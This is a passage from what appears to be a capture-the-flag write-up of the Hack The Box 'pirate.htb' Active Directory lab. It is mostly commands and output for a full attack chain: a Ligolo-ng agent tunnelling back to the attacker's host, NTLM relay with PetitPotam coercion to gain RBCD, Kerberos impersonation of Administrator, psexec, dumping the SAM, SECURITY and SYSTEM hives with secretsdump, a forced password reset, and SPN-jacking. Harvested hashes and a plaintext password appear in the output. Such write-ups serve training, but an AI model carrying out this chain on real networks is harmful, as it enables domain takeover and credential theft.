AceQualifier          : AccessAllowed

AceQualifier           : AccessAllowed
ObjectDN               : CN=WEB01,CN=Computers,DC=pirate,DC=htb
ActiveDirectoryRights  : Self
ObjectAceType          : DS-Validated-Write-Computer
ObjectSID              : S-1-5-21-4107424128-4158083573-1300325248-3102
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent, InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-10
AccessMask             : 8
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, Inherited
InheritedObjectAceType : Computer
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=WEB01,CN=Computers,DC=pirate,DC=htb
ActiveDirectoryRights  : WriteProperty
ObjectAceType          : ms-TPM-Tpm-Information-For-Computer
ObjectSID              : S-1-5-21-4107424128-4158083573-1300325248-3102
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent, InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-10
AccessMask             : 32
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, Inherited
InheritedObjectAceType : Computer
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=WEB01,CN=Computers,DC=pirate,DC=htb
ActiveDirectoryRights  : ReadProperty, WriteProperty
ObjectAceType          : ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity
ObjectSID              : S-1-5-21-4107424128-4158083573-1300325248-3102
InheritanceFlags       : ContainerInherit, ObjectInherit
BinaryLength           : 40
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-10
AccessMask             : 48
AuditFlags             : None
IsInherited            : True
AceFlags               : ObjectInherit, ContainerInherit, Inherited
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=WEB01,CN=Computers,DC=pirate,DC=htb
ActiveDirectoryRights  : ReadProperty, WriteProperty, ExtendedRight
ObjectAceType          : Private-Information
ObjectSID              : S-1-5-21-4107424128-4158083573-1300325248-3102
InheritanceFlags       : ContainerInherit
BinaryLength           : 40
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-10
AccessMask             : 304
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, Inherited
InheritedObjectAceType : All
OpaqueLength           : 0

*Evil-WinRM* PS C:\Users\gMSA_ADFS_prod$\Desktop> Get-DomainObjectAcl -Identity WEB01$ -ResolveGUIDs | Where-Object {$_.ObjectAceType -match "ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity"}


AceQualifier           : AccessAllowed
ObjectDN               : CN=WEB01,CN=Computers,DC=pirate,DC=htb
ActiveDirectoryRights  : ReadProperty, WriteProperty
ObjectAceType          : ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity
ObjectSID              : S-1-5-21-4107424128-4158083573-1300325248-3102
InheritanceFlags       : ContainerInherit, ObjectInherit
BinaryLength           : 40
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-10
AccessMask             : 48
AuditFlags             : None
IsInherited            : True
AceFlags               : ObjectInherit, ContainerInherit, Inherited
InheritedObjectAceType : All
OpaqueLength           : 0
```

[Security identifiers](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers)

![](./images/Pasted%20image%2020260302192445.png)

The SELF Permission allows a machine account (WEB01$) to have control over some aspects of its own object in Active Directory, like:

- **Validated-SPN**: Can modify his own Service Principal Names (SPNs).
- **ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity**: Can configure Resource-Based Constrained Delegation (RBCD).

### What is msDS-AllowedToActOnBehalfOfOtherIdentity?

This attribute defines which security principals are allowed to impersonate users to this service using Kerberos delegation.

### How does it work internally?

When machine A wants to impersonate users against machine B

1. A ask to DC a Kerberos ticket for B.
2. The Domain Controller checks the attribute on machine B.

``` python
msDS-AllowedToActOnBehalfOfOtherIdentity
```

If A SID is inside -> The DC allows delegation.
Otherwise -> It rejects it

# User

## NTLM relay
### Ligolo-ng

Windows

``` python
*Evil-WinRM* PS C:\Users\gMSA_ADCS_prod$\Desktop> ls


    Directory: C:\Users\gMSA_ADCS_prod$\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         3/1/2026  11:32 AM        7302656 agent.exe


*Evil-WinRM* PS C:\Users\gMSA_ADCS_prod$\Desktop>

*Evil-WinRM* PS C:\Users\gMSA_ADCS_prod$\Desktop> ./agent -connect 10.10.14.131:11601 -ignore-cert
agent.exe : time="2026-03-01T11:35:36-08:00" level=warning msg="warning, certificate validation disabled"
    + CategoryInfo          : NotSpecified: (time="2026-03-0...ation disabled":String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
time="2026-03-01T11:35:36-08:00" level=info msg="Connection established" addr="10.10.14.131:11601"
```

Linux

``` python
└─$ sudo ./proxy -selfcert
INFO[0000] Loading configuration file ligolo-ng.yaml
WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC!
INFO[0000] Listening on 0.0.0.0:11601
INFO[0000] Starting Ligolo-ng Web, API URL is set to: http://127.0.0.1:8080
WARN[0000] Ligolo-ng API is experimental, and should be running behind a reverse-proxy if publicly exposed.
    __    _             __
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ /
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /
        /____/                          /____/

  Made in France ♥            by @Nicocha30!
  Version: 0.8.3

ligolo-ng » INFO[0016] Agent joined.                                 id=00155d0bd000 name="PIRATE\\gMSA_ADCS_prod$@DC01" remote="10.129.6.74:61109"
ligolo-ng » session
? Specify a session : 1 - PIRATE\gMSA_ADCS_prod$@DC01 - 10.129.6.74:61109 - 00155d0bd000
[Agent : PIRATE\gMSA_ADCS_prod$@DC01] » autoroute
? Select routes to add: 192.168.100.1/24
? Create a new interface or use an existing one? Create a new interface
? Enter interface name (leave empty for random name):
INFO[0082] Generating a random interface name...
INFO[0082] Using interface name engagingmicroma
INFO[0082] Interface engagingmicroma configured (will be created on tunnel start)
INFO[0082] Creating routes for engagingmicroma...
? Start the tunnel? Yes
INFO[0084] Starting tunnel to PIRATE\gMSA_ADCS_prod$@DC01 (00155d0bd000)
[Agent : PIRATE\gMSA_ADCS_prod$@DC01] »
```

### ping

``` python
└─$ ping $target1
PING 192.168.100.2 (192.168.100.2) 56(84) bytes of data.
64 bytes from 192.168.100.2: icmp_seq=1 ttl=64 time=168 ms
64 bytes from 192.168.100.2: icmp_seq=2 ttl=64 time=164 ms
^C
--- 192.168.100.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1076ms
rtt min/avg/max/mdev = 163.926/166.103/168.280/2.177 ms
```

### Nmap 192.168.100.2

``` python
└─$ nmap -Pn -T4 $target1
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-02 00:54 -05
Stats: 0:00:11 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 31.85% done; ETC: 00:55 (0:00:24 remaining)
Stats: 0:00:20 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 83.15% done; ETC: 00:55 (0:00:04 remaining)
Nmap scan report for 192.168.100.2 (192.168.100.2)
Host is up (0.31s latency).
Not shown: 990 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
443/tcp  open  https
445/tcp  open  microsoft-ds
808/tcp  open  ccproxy-http
1500/tcp open  vlsi-lm
1501/tcp open  sas-3
5357/tcp open  wsdapi
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 24.04 seconds
```

### SMB signing on WEB01

We can relay SMB authentication.

``` python
$ nxc smb $target1 -u $user2 -H $password2
SMB         192.168.100.2   445    WEB01            [*] Windows 10 / Server 2019 Build 17763 x64 (name:WEB01) (domain:pirate.htb) (signing:False) (SMBv1:False)
SMB         192.168.100.2   445    WEB01            [+] pirate.htb\gMSA_ADCS_prod$:304106f739822ea2ad8ebe23f802d078
```

``` python
$ impacket-ntlmrelayx -t ldaps://$target --delegate-access --escalate-user $user2 --remove-mic -smb2support
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] Protocol Client SMTP loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client WINRMS loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client SMB loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Setting up WinRM (HTTP) Server on port 5985
[*] Setting up WinRMS (HTTPS) Server on port 5986
[*] Setting up RPC Server on port 135
[*] Multirelay disabled

[*] Servers started, waiting for connections
[*] (SMB): Received connection from 10.129.87.140, attacking target ldaps://10.129.87.140
[*] (SMB): Authenticating connection from PIRATE/WEB01$@10.129.87.140 against ldaps://10.129.87.140 SUCCEED [1]
[*] ldaps://PIRATE/WEB01$@10.129.87.140 [1] -> Enumerating relayed user's privileges. This may take a while on large domains
[*] All targets processed!
[*] (SMB): Connection from 10.129.87.140 controlled, but there are no more targets left!
[*] ldaps://PIRATE/WEB01$@10.129.87.140 [1] -> Delegation rights modified succesfully!
[*] ldaps://PIRATE/WEB01$@10.129.87.140 [1] -> gMSA_ADCS_prod$ can now impersonate users on WEB01$ via S4U2Proxy
```

``` python
python3 PetitPotam.py -u $user2 -hashes :$password2 -d pirate.htb 10.10.14.38 $target1
/home/rc/PetitPotam/PetitPotam.py:23: SyntaxWarning: invalid escape sequence '\ '
  | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __


              ___            _        _      _        ___            _
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_|
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""|
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'

              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam (@topotam77)

                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN



Trying pipe lsarpc
[-] Connecting to ncacn_np:192.168.100.2[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!

rc@Cesar:~/PetitPotam
HTB:10.10.14.33
$ impacket-getST -spn CIFS/WEB01.pirate.htb -impersonate Administrator -hashes :$password2 pirate.htb/$user2
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@WSMAN_WEB01.pirate.htb@PIRATE.HTB.ccache
```

## impacket psexec

``` python
$ impacket-psexec -k -no-pass pirate.htb/Administrator@WEB01.pirate.htb
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on WEB01.pirate.htb.....
[*] Found writable share ADMIN$
[*] Uploading file wCdkHXjC.exe
[*] Opening SVCManager on WEB01.pirate.htb.....
[*] Creating service UAWr on WEB01.pirate.htb.....
[*] Starting service UAWr.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.8385]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>
```

# Privilege Scalation

## Sam, Security and System

``` python
C:\Users\Administrator> reg save HKLM\SAM C:\sam.save
The operation completed successfully.

C:\Users\Administrator> reg save HKLM\SYSTEM C:\system.save
The operation completed successfully.

C:\WINDOWS\system32> reg save HKLM\SECURITY C:\security.save
The operation completed successfully.

C:\WINDOWS\system32> dir C:\
 Volume in drive C has no label.
 Volume Serial Number is EA7B-8419

 Directory of C:\

06/09/2025  07:06 AM    <DIR>          ADFSTheme
06/08/2025  12:39 PM    <DIR>          inetpub
11/05/2022  11:03 AM    <DIR>          PerfLogs
06/08/2025  12:29 PM    <DIR>          Program Files
06/09/2025  07:43 AM    <DIR>          Program Files (x86)
03/03/2026  03:29 PM            49,152 sam.save
03/03/2026  09:40 PM            40,960 security.save
03/03/2026  03:29 PM        15,802,368 system.save
06/09/2025  09:11 AM    <DIR>          Users
03/03/2026  09:39 PM    <DIR>          Windows
               3 File(s)     15,892,480 bytes
               7 Dir(s)   4,170,137,600 bytes free
```

## impacket-smbclient

``` python
$ impacket-smbclient -k PIRATE.HTB/Administrator@web01.pirate.htb -no-pass
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands
# shares
ADMIN$
C$
IPC$
# use C$
# ls
drw-rw-rw-          0  Mon Jun  9 12:11:53 2025 $Recycle.Bin
drw-rw-rw-          0  Mon Jun  9 10:06:32 2025 ADFSTheme
-rw-rw-rw-         80  Thu Jan 22 18:26:10 2026 bootTel.dat
drw-rw-rw-          0  Sun Jun  8 15:28:32 2025 Documents and Settings
drw-rw-rw-          0  Sun Jun  8 15:39:53 2025 inetpub
-rw-rw-rw- 1073741824  Tue Mar  3 13:04:31 2026 pagefile.sys
drw-rw-rw-          0  Sun Jun  8 16:26:20 2025 PerfLogs
drw-rw-rw-          0  Sun Jun  8 15:29:24 2025 Program Files
drw-rw-rw-          0  Mon Jun  9 10:43:43 2025 Program Files (x86)
drw-rw-rw-          0  Sun Jun  8 15:35:58 2025 ProgramData
drw-rw-rw-          0  Sun Jun  8 15:28:34 2025 Recovery
-rw-rw-rw-      49152  Tue Mar  3 18:29:17 2026 sam.save
-rw-rw-rw-      40960  Wed Mar  4 00:40:11 2026 security.save
drw-rw-rw-          0  Sun Jun  8 16:08:41 2025 System Volume Information
-rw-rw-rw-   15802368  Tue Mar  3 18:29:22 2026 system.save
drw-rw-rw-          0  Mon Jun  9 12:11:46 2025 Users
drw-rw-rw-          0  Wed Mar  4 00:39:35 2026 Windows
# get sam.save
# get security.save
# get system.save
```

## impacket-secretsdump

``` python$ impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x342dfe90cc4061078b79f011cd08f931
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:b1aac1584c2ea8ed0a9429684e4fc3e5:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:60da2d3ba00d6b5932e4c87dce6fa6b4:::
[*] Dumping cached domain logon information (domain/username:hash)
PIRATE.HTB/Administrator:$DCC2$10240#Administrator#8baf09ddc5830ac4456ee8639dd89644: (2026-02-25 02:41:09+00:00)
PIRATE.HTB/gMSA_ADFS_prod$:$DCC2$10240#gMSA_ADFS_prod$#66812dfee46ff41c9c8245a2819c3183: (2026-03-03 18:06:55+00:00)
PIRATE.HTB/a.white:$DCC2$10240#a.white#366c8924be3ea6d1d12825569a4bcc39: (2026-03-03 18:04:52+00:00)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
$MACHINE.ACC:plain_password_hex:29f1505d87014b01b4317fed1d52ddbee2792a698e7e1de1bcdf29ab5d4b8e54828ce470d23491ba84e82d786622a821a14c730cf8610a32db1951b7619ee08c3bcacbab53aac8e052bd64e638c6bbd9529daacf04f86cfb9034808c4378d2c328c8c6afe7655f4a099dc41caeb6279c53313edcbd58db3e14490b7543ba3250ac200ec9834992b61b3f4319162645b50f402de4db0843fc43db7d54e04828abf86e490959bc88670e50f0b50373a3745f70039f8fd032435c4a725526957c7ae0dbaa81273b3aa28c0b029fea90c271b6601ef3ba7a05a13ec8c8ffd9999dd10eee87b4b9eb08a8a4af90710056f558
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:feba09cf0013fbf5834f50def734bca9
[*] DefaultPassword
(Unknown User):E2nvAOKSz5Xz2MJu
[*] DPAPI_SYSTEM
dpapi_machinekey:0x01cffc2ef9a91d20107371f9a4a4112c892ed989
dpapi_userkey:0xa4fddb1b2df2db7cc3d044dc1b559bc1b45a1de9
[*] NL$KM
 0000   A5 24 39 57 3F 8F 30 DC  61 F1 56 B7 B5 5C 0F 7C   .$9W?.0.a.V..\.|
 0010   6B 0A FF DF B0 A2 99 C3  68 A9 FE 15 E2 48 33 A9   k.......h....H3.
 0020   E9 8C 27 F8 8B 7C 05 55  4D FE 3C 5D 09 EA 9C 49   ..'..|.UM.<]...I
 0030   95 EB 7A 09 5B 48 7A 14  DC 74 E9 CB 7C 1A E0 8A   ..z.[Hz..t..|...
NL$KM:a52439573f8f30dc61f156b7b55c0f7c6b0affdfb0a299c368a9fe15e24833a9e98c27f88b7c05554dfe3c5d09ea9c4995eb7a095b487a14dc74e9cb7c1ae08a
[*] _SC_GMSA_DPAPI_{C6810348-4834-4a1e-817D-5838604E6004}_a09ca32bc7cd2ce752ae0143bd203f0551564c04dd2846c4ed3e4e5a61cc9f11
 0000   E3 EF 47 4B 98 13 8D D4  46 9F 6D C1 76 F8 79 BA   ..GK....F.m.v.y.
 0010   1E 08 17 BA 44 50 21 87  B9 08 0B 9F 33 34 C9 1B   ....DP!.....34..
 0020   9B 1A F1 CE 4E 91 FB 56  2C 8D 88 24 41 2C 70 0E   ....N..V,..$A,p.
 0030   00 D1 05 BC 67 4D 8E 26  A5 94 E3 DA 41 73 F2 C8   ....gM.&....As..
 0040   73 13 D6 34 B3 9C 34 12  D4 BF B6 84 92 47 68 6D   s..4..4......Ghm
 0050   F6 06 5B 53 65 66 80 7E  0A CE 92 F9 4E A3 16 6B   ..[Sef.~....N..k
 0060   B9 75 2D 12 D3 52 C8 9B  9F DA FA 7D 31 71 E4 DD   .u-..R.....}1q..
 0070   55 BE 9D 58 55 04 F8 C6  28 A0 FF 4C 67 0D 75 95   U..XU...(..Lg.u.
 0080   A9 09 A3 C9 A7 EC 2D FF  98 4E 5D DF 77 04 9A 91   ......-..N].w...
 0090   A5 59 7F 0A 39 C5 49 94  55 67 59 01 CC E4 1A DE   .Y..9.I.UgY.....
 00a0   D9 8D 80 A1 B5 F7 F8 2C  C2 20 B5 90 DF 4B FC 0B   .......,. ...K..
 00b0   FC 5F 0F EB 66 E7 3A 56  F1 AB 7F E9 14 C6 D7 CD   ._..f.:V........
 00c0   2B 83 E0 B9 06 5B 76 E0  2B C3 30 F7 69 44 16 F3   +....[v.+.0.iD..
 00d0   AC D6 C4 63 DF 84 92 35  00 B6 4A 10 14 E7 44 13   ...c...5..J...D.
 00e0   80 9A 7A 06 AF 57 7C E7  68 5B FD 2A B5 6A 20 67   ..z..W|.h[.*.j g
_SC_GMSA_DPAPI_{C6810348-4834-4a1e-817D-5838604E6004}_a09ca32bc7cd2ce752ae0143bd203f0551564c04dd2846c4ed3e4e5a61cc9f11:e3ef474b98138dd4469f6dc176f879ba1e0817ba44502187b9080b9f3334c91b9b1af1ce4e91fb562c8d8824412c700e00d105bc674d8e26a594e3da4173f2c87313d634b39c3412d4bfb6849247686df6065b536566807e0ace92f94ea3166bb9752d12d352c89b9fdafa7d3171e4dd55be9d585504f8c628a0ff4c670d7595a909a3c9a7ec2dff984e5ddf77049a91a5597f0a39c5499455675901cce41aded98d80a1b5f7f82cc220b590df4bfc0bfc5f0feb66e73a56f1ab7fe914c6d7cd2b83e0b9065b76e02bc330f7694416f3acd6c463df84923500b64a1014e74413809a7a06af577ce7685bfd2ab56a2067
[*] _SC_GMSA_{84A78B8C-56EE-465b-8496-FFB35A1B52A7}_a09ca32bc7cd2ce752ae0143bd203f0551564c04dd2846c4ed3e4e5a61cc9f11
 0000   01 00 00 00 22 01 00 00  10 00 00 00 12 01 1A 01   ...."...........
 0010   B6 C4 08 39 11 A2 83 50  B1 FD 69 48 80 36 50 E1   ...9...P..iH.6P.
 0020   B1 C5 74 1F 77 19 B1 F4  FF 92 62 03 DC DF 4E C9   ..t.w.....b...N.
 0030   C0 36 9B 7B 92 FE 10 A2  D7 FF 95 3B FA 40 6A 3B   .6.{.......;.@j;
 0040   67 86 52 3E D8 27 67 CC  8F E2 73 4A F8 92 E9 8E   g.R>.'g...sJ....
 0050   FB EF 2B 34 76 75 90 32  B4 EC DE F3 42 76 C3 63   ..+4vu.2....Bv.c
 0060   B8 A9 41 0B 63 D8 09 EA  6E F1 67 F5 B5 41 D7 3C   ..A.c...n.g..A.<
 0070   3A C4 21 4D A2 2A 14 D9  79 82 C9 28 D9 1B B9 71   :.!M.*..y..(...q
 0080   FE 99 D4 80 9C 1E BD EA  E8 E7 69 C6 B3 37 7E E1   ..........i..7~.
 0090   A4 78 DF FB B2 DD C1 33  18 BE 13 11 67 D1 A4 A0   .x.....3....g...
 00a0   18 33 A4 C2 7E 05 12 69  0D 73 DE 1E 59 A0 17 61   .3..~..i.s..Y..a
 00b0   EC 7D 40 FC 18 82 05 0C  BF 43 9D 9C BB 28 1A 06   .}@......C...(..
 00c0   D4 BF 8D 85 D1 FE B2 74  0E C3 99 EC A0 E4 6E 36   .......t......n6
 00d0   99 0B 72 B2 C4 A6 4A E0  09 BA FB 3D FD 26 4F F7   ..r...J....=.&O.
 00e0   34 B6 3F B9 22 60 9E 8C  30 58 83 A7 5D 9A EF 75   4.?."`..0X..]..u
 00f0   CE 37 BC A0 91 04 36 59  0D 93 12 FC A4 6A D8 9A   .7....6Y.....j..
 0100   61 A8 9B DD C8 73 19 7D  E4 8E AB 3D 69 B9 E4 98   a....s.}...=i...
 0110   00 00 19 41 B0 1B 73 17  00 00 19 E3 DF 68 72 17   ...A..s......hr.
 0120   00 00                                              ..
_SC_GMSA_{84A78B8C-56EE-465b-8496-FFB35A1B52A7}_a09ca32bc7cd2ce752ae0143bd203f0551564c04dd2846c4ed3e4e5a61cc9f11:01000000220100001000000012011a01b6c4083911a28350b1fd6948803650e1b1c5741f7719b1f4ff926203dcdf4ec9c0369b7b92fe10a2d7ff953bfa406a3b6786523ed82767cc8fe2734af892e98efbef2b3476759032b4ecdef34276c363b8a9410b63d809ea6ef167f5b541d73c3ac4214da22a14d97982c928d91bb971fe99d4809c1ebdeae8e769c6b3377ee1a478dffbb2ddc13318be131167d1a4a01833a4c27e0512690d73de1e59a01761ec7d40fc1882050cbf439d9cbb281a06d4bf8d85d1feb2740ec399eca0e46e36990b72b2c4a64ae009bafb3dfd264ff734b63fb922609e8c305883a75d9aef75ce37bca0910436590d9312fca46ad89a61a89bddc873197de48eab3d69b9e49800001941b01b7317000019e3df6872170000
[*] Cleaning up...
```

``` python
DefaultPassword: E2nvAOKSz5Xz2MJu
```

Test with a.white:

``` python
$ nxc smb $target -u $user4 -p $password4
SMB         10.129.90.230   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:False)
SMB         10.129.90.230   445    DC01             [+] pirate.htb\a.white:E2nvAOKSz5Xz2MJu

rc@Cesar:~/PetitPotam
HTB:10.10.14.38
$ nxc smb $target1 -u $user4 -p $password4
SMB         192.168.100.2   445    WEB01            [*] Windows 10 / Server 2019 Build 17763 x64 (name:WEB01) (domain:pirate.htb) (signing:False) (SMBv1:False)
SMB         192.168.100.2   445    WEB01            [+] pirate.htb\a.white:E2nvAOKSz5Xz2MJu

rc@Cesar:~/PetitPotam
HTB:10.10.14.38
$ nxc winrm $target1 -u $user4 -p $password4
WINRM       192.168.100.2   5985   WEB01            [*] Windows 10 / Server 2019 Build 17763 (name:WEB01) (domain:pirate.htb)
WINRM       192.168.100.2   5985   WEB01            [-] pirate.htb\a.white:E2nvAOKSz5Xz2MJu

rc@Cesar:~/PetitPotam
HTB:10.10.14.38
$ nxc winrm $target -u $user4 -p $password4
WINRM       10.129.90.230   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb)
WINRM       10.129.90.230   5985   DC01             [-] pirate.htb\a.white:E2nvAOKSz5Xz2MJu

rc@Cesar:~/PetitPotam
```


![](./images/Pasted%20image%2020260303193428.png)


``` python
$ bloodyAD --host $target -d $domain -u $user4 -p $password4 set password "a.white_adm" 'Password123!'
[+] Password changed successfully!
```

``` python
rc@Cesar:~/PetitPotam
HTB:10.10.14.38
$ nxc smb $target -u a.white_adm -p 'Password123!'
SMB         10.129.47.154   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:False)
SMB         10.129.47.154   445    DC01             [+] pirate.htb\a.white_adm:Password123!

rc@Cesar:~/PetitPotam
HTB:10.10.14.38
$ nxc ldap $target -u a.white_adm -p 'Password123!'
LDAP        10.129.47.154   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb)
LDAP        10.129.47.154   389    DC01             [+] pirate.htb\a.white_adm:Password123!

rc@Cesar:~/PetitPotam
```

## SPN-Jacking

SPN-jacking is an attack that allows an attacker to redirect delegation privileges from one service to another by manipulating Service Principal Names.
### The user A.WHITE_ADM@PIRATE.HTB has the constrained delegation permission to the computer WEB01.PIRATE.HTB.

The image shows a delegation relationship in Active Directory:

This means that the principal can authenticate as any user to specific services on the target computer. This account can act like any other user just to connect to that server's HTTP service.

![](./images/Pasted%20image%2020260303193208.png)



![](./images/Pasted%20image%2020260303193333.png)

We removed the SPN from WEB01

``` python
$ addspn -u "$domain\\$user5" -p "$password5" -t 'WEB01$' -s 'HTTP/WEB01.pirate.htb' -r $target
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
[+] SPN Modified successfully
```

Because Kerberos uses the SPN to determine which account owns the service, moving the SPN from WEB01 to DC01 causes the KDC to issue service tickets for DC01 instead of WEB01. 
As a result, the attacker can redirect authentication flows and abuse delegation privileges to escalate privileges to the domain controller.

This resulted in:

``` python
Before:

HTTP/WEB01.pirate.htb -> WEB01

After:

HTTP/WEB01.pirate.htb -> (removed)
```

In Active Directory:

``` python
servicePrincipalName = unique identifier
```

An SPN cannot exist in two objects.
Then, after removing it,

``` python
HTTP/WEB01.pirate.htb remains free
```

We then add it to the Domain Controller.

``` python
addspn -u "$domain\\$user5" -p 'Password123!' -t 'DC01$' -s 'HTTP/WEB01.pirate.htb' $target
```

``` python
HTTP/WEB01.pirate.htb -> DC01
```

Enumeration:

``` python
addspn -u "$domain\\$user5" -p "$password5" -t 'DC01$' -r $target -q
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
DN: CN=DC01,OU=Domain Controllers,DC=pirate,DC=htb - STATUS: Read - READ TIME: 2026-03-04T10:42:32.661778
    dNSHostName: DC01.pirate.htb
    sAMAccountName: DC01$
    servicePrincipalName: HTTP/WEB01.pirate.htb
                          Hyper-V Replica Service/DC01
                          Hyper-V Replica Service/DC01.pirate.htb
                          Microsoft Virtual System Migration Service/DC01
                          Microsoft Virtual System Migration Service/DC01.pirate.htb
                          Microsoft Virtual Console Service/DC01
                          Microsoft Virtual Console Service/DC01.pirate.htb
                          Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/DC01.pirate.htb
                          ldap/DC01.pirate.htb/ForestDnsZones.pirate.htb
                          ldap/DC01.pirate.htb/DomainDnsZones.pirate.htb
                          DNS/DC01.pirate.htb
                          GC/DC01.pirate.htb/pirate.htb
                          RestrictedKrbHost/DC01.pirate.htb
                          RestrictedKrbHost/DC01
                          RPC/21c2943d-6163-4df9-aff7-3d164aa2cfbb._msdcs.pirate.htb
                          HOST/DC01/PIRATE
                          HOST/DC01.pirate.htb/PIRATE
                          HOST/DC01
                          HOST/DC01.pirate.htb
                          HOST/DC01.pirate.htb/pirate.htb
                          E3514235-4B06-11D1-AB04-00C04FC2DCD2/21c2943d-6163-4df9-aff7-3d164aa2cfbb/pirate.htb
                          ldap/DC01/PIRATE
                          ldap/21c2943d-6163-4df9-aff7-3d164aa2cfbb._msdcs.pirate.htb
                          ldap/DC01.pirate.htb/PIRATE
                          ldap/DC01
                          ldap/DC01.pirate.htb
                          ldap/DC01.pirate.htb/pirate.htb
                          
```

This means:

When a client asks for a ticket for:

``` python
HTTP/WEB01.pirate.htb
```

The KDC searches LDAP

``` python
servicePrincipalName = HTTP/WEB01.pirate.htb
```

find

``` python
DC01
```

then, the ticket issued is really for:

``` python
service = DC01
```

